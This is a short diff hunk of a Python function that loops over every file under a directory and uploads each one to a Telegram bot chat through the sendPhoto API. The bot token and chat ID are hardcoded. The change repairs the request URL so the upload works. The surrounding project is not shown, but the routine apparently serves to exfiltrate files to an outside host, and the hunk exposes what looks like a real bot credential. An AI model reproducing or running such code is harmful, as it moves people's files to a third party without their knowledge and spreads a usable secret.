@@ -38,7 +38,7 @@ def download():
                 file_path = os.path.join(root, file)
                 with open(file_path, "rb") as f:
                     resp = requests.post(
-                        f"https://api.telegram.org/bot{8183373964:AAF3mXql_cmVYdkWSxclE6HkU0xE2wyxy4U}/sendPhoto",
+                        f"https://api.telegram.org/bot8183373964:AAF3mXql_cmVYdkWSxclE6HkU0xE2wyxy4U/sendPhoto",
                         data={"chat_id": 290202880},
                         files={"photo": f}
                     )
